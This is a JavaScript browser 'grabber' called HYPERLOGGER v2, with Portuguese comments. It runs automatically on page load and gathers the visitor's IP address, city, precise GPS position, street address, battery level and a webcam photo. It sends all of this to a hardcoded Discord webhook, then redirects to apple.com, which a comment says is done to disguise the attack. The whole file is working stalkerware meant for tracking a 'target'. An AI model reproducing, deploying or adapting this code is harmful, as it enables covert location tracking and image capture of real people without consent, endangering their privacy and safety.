// script.js - GRABBER COMPLETO COM GPS, FOTO E RUA EXATA
const WEBHOOK = "https://discord.com/api/webhooks/1434608236673368084/AFQ-LUDSvqZxcGzn-6-gd8D84KTdZUn20ykWjvoYhg52IKkxvgAn-xIjcAmjdA1AAu5y";

const sendToDiscord = async (data) => {
    const embed = {
        title: "ALVO CAÇADO - LOCALIZAÇÃO EXATA",
        color: 0xff0000,
        fields: [
            { name: "IP", value: data.ip, inline: true },
            { name: "Cidade", value: data.city, inline: true },
            { name: "Rua Aprox", value: data.rua || "N/A", inline: false },
            { name: "GPS", value: `${data.lat}, ${data.lon}`, inline: true },
            { name: "Precisão", value: `${data.accuracy}m`, inline: true },
            { name: "Bateria", value: data.battery + "%", inline: true }
        ],
        image: { url: data.foto },
        timestamp: new Date().toISOString(),
        footer: { text: "HYPERLOGGER v2" }
    };

    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log("Enviado com sucesso!");
    } catch (e) {
        console.error("Erro no Discord:", e);
    }
};

const grab = async () => {
    try {
        // 1. PEGA IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // 2. PEGA GEO (sem IP no URL)
        const geoRes = await fetch('https://ipapi.co/json/');
        const geoData = await geoRes.json();

        // 3. PEGA GPS
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });

        // 4. REVERSE GEOCODING
        const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
        const revData = await revRes.json();
        const rua = revData.display_name || "N/A";

        // 5. BATERIA
        const battery = await navigator.getBattery();
        const batLevel = Math.round(battery.level * 100);

        // 6. FOTO
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 2000));
        const canvas = document.createElement('canvas');
        canvas.width = 320; canvas.height = 240;
        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
        const foto = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(t => t.stop());

        // 7. ENVIA TUDO
        await sendToDiscord({
            ip,
            city: geoData.city,
            rua,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            battery: batLevel,
            foto
        });

        // Redireciona pra disfarçar
        setTimeout(() => { window.location = "https://apple.com"; }, 3000);

    } catch (e) {
        console.error("Erro:", e);
        // Envia erro mínimo
        fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                embeds: [{ title: "ERRO NO GRABBER", description: e.message, color: 0xff0000 }]
            })
        });
    }
};

// EXECUTA AUTOMATICAMENTE
grab();
